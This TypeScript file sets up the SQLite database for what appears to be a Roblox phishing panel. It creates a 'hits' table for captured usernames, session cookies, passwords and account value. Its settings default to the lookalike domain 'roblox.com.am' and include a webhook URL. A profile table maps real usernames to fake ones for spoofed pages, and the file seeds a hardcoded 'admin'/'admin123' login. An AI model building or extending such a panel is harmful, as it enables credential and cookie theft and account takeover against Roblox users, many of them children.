import sqlite3 from 'sqlite3';
import { open } from 'sqlite';

let db: any;

export async function openDb() {
    if (!db) {
        db = await open({
            filename: './database.db',
            driver: sqlite3.Database
        });
        await initTables();
    }
    return db;
}

async function initTables() {
    await db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT DEFAULT 'user',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user TEXT,
            cookie TEXT,
            password TEXT,
            rap INTEGER DEFAULT 0,
            summary INTEGER DEFAULT 0,
            value INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS settings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT DEFAULT 'roblox.com.am',
            site_id TEXT,
            site_code TEXT,
            webhook_url TEXT,
            auth_enabler BOOLEAN DEFAULT 0,
            age_changer BOOLEAN DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS profile (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            real_username TEXT,
            fake_username TEXT,
            display_name TEXT,
            premium BOOLEAN DEFAULT 0,
            friends INTEGER DEFAULT 0,
            followers INTEGER DEFAULT 0,
            followings INTEGER DEFAULT 0,
            status TEXT DEFAULT 'Offline',
            creation_date TEXT,
            description TEXT
        );

        CREATE TABLE IF NOT EXISTS groups (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            group_url TEXT,
            owner TEXT,
            name TEXT,
            members INTEGER DEFAULT 0,
            verified BOOLEAN DEFAULT 0,
            funds INTEGER DEFAULT 0,
            description TEXT,
            shout TEXT
        );

        CREATE TABLE IF NOT EXISTS games (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            status TEXT,
            creation_date TEXT,
            description TEXT
        );

        INSERT OR IGNORE INTO users (username, password, role) VALUES ('admin', 'admin123', 'admin');
        INSERT OR IGNORE INTO settings (id, domain) VALUES (1, 'roblox.com.am');
        INSERT OR IGNORE INTO profile (id, real_username, fake_username, display_name) VALUES (1, 'stumponalump', 'Sonionlol', 'Paws');
        INSERT OR IGNORE INTO groups (id, group_url, name, members) VALUES (1, 'https://www.roblox.com/communities/7/Gro', 'Unset', 1);
    `);
}